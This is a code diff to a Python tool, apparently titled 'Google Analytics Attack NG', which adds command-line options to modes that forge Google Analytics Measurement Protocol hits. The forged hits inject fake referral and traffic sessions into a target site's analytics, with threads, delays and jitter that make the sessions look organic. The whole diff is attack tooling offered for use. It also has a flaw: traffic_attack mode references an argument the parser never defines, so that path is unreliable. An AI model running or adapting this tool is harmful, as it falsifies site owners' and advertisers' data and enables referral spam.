@@ -7,6 +7,7 @@ import google
 import logging
 from Queue import Queue
 from threading import Thread
+import argparse
 
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/
 #https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid
@@ -21,24 +22,50 @@ def main():
         #'http': 'http://192.168.0.107:8080',
         #'https': 'https://192.168.0.107:8080'
     }
-    logging.basicConfig(level=logging.INFO)
-    session = referer_page_attack_session(target_url='http://zonksec.com', referral_url='https://hackerman.com/', bounces=2,bounce_jitter=.50,session_jitter=.50,session_delay=5, end_with=True)
-    single_page_attack(session=session, number_of_sessions=5, threads=2)
-    #session = site_attack(target_site='http://zonksec.com',referral_keyword='hacker blog',target_site_url_pool=5,referral_pool=10, bounces=2,session_delay=0,session_jitter=0)
-    #session.run(client_id=402)
+
+
+    parser = argparse.ArgumentParser(description='Google Analytics Attack NG By ZonkSec')
+    parser.add_argument('-m','--mode',choices=['referral_attack', 'traffic_attack'],help='Required. This tells the script which mode to operate in',required=True)
+    parser.add_argument("-v", "--verbose", help="increase output verbosity",action="store_true")
+    parser.add_argument('--target_url', help='required.', required=True)
+    parser.add_argument('--referral_url', help='required.',required=True)
+    parser.add_argument('-n','--number_of_sessions', help='required. total number of sessions to be emulated',required=True,type=int)
+    parser.add_argument('--threads', help='number of threads, aka concurrent sessions', default=1, type=int, metavar='')
+    parser.add_argument('--user_delay', help='delay between users/threads', default=0, type=int, metavar='')
+    parser.add_argument('--user_jitter', help='amount of randomness in user_delay', default=0, type=float, metavar='')
+    parser.add_argument('--bounces', help='number of bounces between target pages',type=int,metavar='',default=0)
+    parser.add_argument('--bounce_urls', help='specific URLs to bounce too. If not set, it will be auto-populated via Google Search',nargs='+',metavar='')
+    parser.add_argument('--bounce_jitter',metavar='',help='amount of randomness in bounce URL selection',type=float,default=0)
+    parser.add_argument('--bounce_pool',metavar='',help='determines # of URLs to retreive from Google, if not proving bounce_urls',type=int,default=20)
+    parser.add_argument('--session_delay',metavar='',help='amount of seconds between bounces in a session',type=int,default=0)
+    parser.add_argument('--session_jitter',metavar='',help='amount of randomness in session_delay',type=float,default=0)
+    parser.add_argument('--end_with',action="store_true",help='end with a bounce to target page')
+    args = parser.parse_args()
+
+    if args.verbose:
+        logging.basicConfig(level=logging.DEBUG)
+    else:
+        logging.basicConfig(level=logging.INFO)
+
+    if args.mode == 'referral_attack':
+        session = referral_attack(target_url=args.target_url, referral_url=args.referral_url,bounce_urls=args.bounce_urls, bounces=args.bounces, bounce_jitter=args.bounce_jitter, session_jitter=args.session_jitter, session_delay=args.session_delay, end_with=args.end_with,bounce_pool=args.bounce_pool)
+        single_page_attack(session=session, number_of_sessions=args.number_of_sessions, threads=args.threads,user_delay=args.user_delay,user_jitter=args.user_jitter)
+    elif args.mode == 'traffic_attack':
+        session = traffic_attack(target_site='http://zonksec.com', target_site_urls=args.traffic_urls,referral_keyword='how to hack',target_site_url_pool=5, referral_pool=10, bounces=2, session_delay=0, session_jitter=0)
+        session.run(client_id=402)
 
 
 
 
 
-def single_page_attack(session, number_of_sessions, threads=1, delay=5, jitter=.50):
+def single_page_attack(session, number_of_sessions, threads=1, user_delay=5, user_jitter=.50):
     session_queue = Queue()
     logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
     for _ in range(number_of_sessions):
         session_queue.put("")
     logging.info('[*] Starting %s threads.', str(threads))
     for i in range(threads):
-        worker = Thread(target=thread_session, args=(i, session_queue, session,delay,jitter))
+        worker = Thread(target=thread_session, args=(i, session_queue, session, user_delay, user_jitter))
         worker.setDaemon(True)
         worker.start()
     logging.info('[*] Waiting for threads.')
@@ -57,8 +84,8 @@ def thread_session(i,q,session,delay=5,jitter=.50):
         time.sleep(time_delay)
         q.task_done()
 
-class referer_page_attack_session:
-    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=True, tracking_id=None, geo_id='',bounce_jitter=.50):
+class referral_attack:
+    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20, loop=1, end_with=False, tracking_id=None, geo_id='',bounce_jitter=.50):
         self.target_url = target_url
         self.referral_url = referral_url
         self.page_delay = session_delay
@@ -124,7 +151,7 @@ class referer_page_attack_session:
                 delay = self.page_delay - random.randint(0,int(self.page_delay * self.page_delay_jitter))
                 logging.debug('[*] Session sleep for %i seconds.', delay)
                 time.sleep(delay)
-                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls))],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
+                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,len(self.bounce_urls)-1)],document_referrer=last_page,client_id=client_id,tracking_id=self.tracking_id,geo_id=self.geo_id)
                 bounce_request.send()
                 pages.append(bounce_request.document_location)
                 last_page = bounce_request.document_location
@@ -144,7 +171,7 @@ class referer_page_attack_session:
 
         return behavior[:-4]
 
-class site_attack:
+class traffic_attack:
     def __init__(self,target_site,target_site_urls=None,target_site_keyword=None,tracking_id=None,target_site_url_pool=10,referral_urls=None, referral_keyword=None,referral_pool=20,bounce_urls = None, session_delay=30, session_jitter=.50, bounces=0, bounce_pool = 20):
         self.referral_urls = referral_urls
         self.referral_keyword = referral_keyword
@@ -208,6 +235,7 @@ class site_attack:
             pages = []
             request = analytics_request(document_location=self.target_site_urls[count], document_referrer=self.referral_urls[random.randint(0,(len(self.referral_urls)-1))], client_id=client_id,tracking_id=self.tracking_id, geo_id='')
             pages.append(request.document_referrer)
+            pages.append(self.target_site_urls[count])
             last_page = self.target_site_urls[count]
             request.send()
             count = count + 1
@@ -225,7 +253,7 @@ class site_attack:
             behavior = ''
             for page in pages:
                 behavior = behavior + page + ' => '
-            print(behavior)
+            print(behavior[:-4])
 
 
 
